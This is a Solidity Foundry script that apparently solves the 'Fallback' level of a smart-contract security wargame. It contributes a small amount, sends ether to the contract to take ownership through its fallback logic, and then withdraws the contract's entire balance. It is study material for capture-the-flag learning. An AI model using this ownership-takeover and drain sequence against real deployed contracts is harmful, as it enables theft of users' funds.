// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Fallback.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallbackSolution is Script {
    Fallback constant fallbackInstance =
        Fallback(payable(0xEAB1331003FCa309ea3Abe60eAf55435046C2458));
    address myAddress = vm.envAddress("MY_ADDRESS");

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        fallbackInstance.contribute{value: 1}();
        (bool success, ) = address(fallbackInstance).call{value: 1}("");
        require(success);
        require(fallbackInstance.owner() == myAddress);

        fallbackInstance.withdraw();
        require(address(fallbackInstance).balance == 0);

        vm.stopBroadcast();
    }
}
